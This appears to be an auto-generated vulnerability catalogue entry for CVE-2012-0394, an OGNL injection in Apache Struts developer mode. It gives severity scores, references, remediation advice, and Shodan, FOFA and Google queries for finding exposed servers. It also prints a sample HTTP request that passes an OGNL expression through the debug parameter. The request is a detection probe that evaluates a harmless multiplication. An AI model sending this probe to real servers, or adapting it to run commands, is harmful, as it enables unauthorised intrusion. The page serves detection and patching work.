---
layout: post
cve_id: CVE-2012-0394
title: Apache Struts <2.3.1.1 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2012/CVE-2012-0394.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2012/CVE-2012-0394.yaml
snort2_rule: N/A
snort3_rule: N/A
author: tess
severity: medium
impact: 'Successful exploitation of this vulnerability allows remote attackers to
  execute arbitrary code on the affected server.

  '
remediation: 'Upgrade Apache Struts to a version higher than 2.3.1.1 or apply the
  necessary patches.

  '
reference:
- https://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/
- https://www.exploit-db.com/exploits/31434
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0394
- http://www.exploit-db.com/exploits/18329
- https://nvd.nist.gov/vuln/detail/CVE-2012-0394
classification:
  cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
  cvss-score: 6.8
  cve-id: CVE-2012-0394
  cwe-id: CWE-94
  epss-score: 0.92749
  epss-percentile: 0.99741
  cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: apache
  product: struts
  shodan-query:
  - html:"Struts Problem Report"
  - http.title:"struts2 showcase"
  - http.html:"struts problem report"
  - http.html:"apache struts"
  fofa-query:
  - body="struts problem report"
  - title="struts2 showcase"
  - body="apache struts"
  google-query: intitle:"struts2 showcase"
tags:
- cve
- cve2012
- ognl
- injection
- edb
- apache
- struts
- vuln
---

## ðŸ” Vulnerability Description
Apache Struts before 2.3.1.1 is susceptible to remote code execution. When developer mode is used in the DebuggingInterceptor component, a remote attacker can execute arbitrary OGNL commands via unspecified vectors, which can allow for execution of malware, obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.. NOTE: the vendor characterizes this behavior as not "a security vulnerability itself."


## ðŸŒ HTTP Request
```nohighlight
GET /portal/displayAPSForm.action?debug=command&expression=1393*1615 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

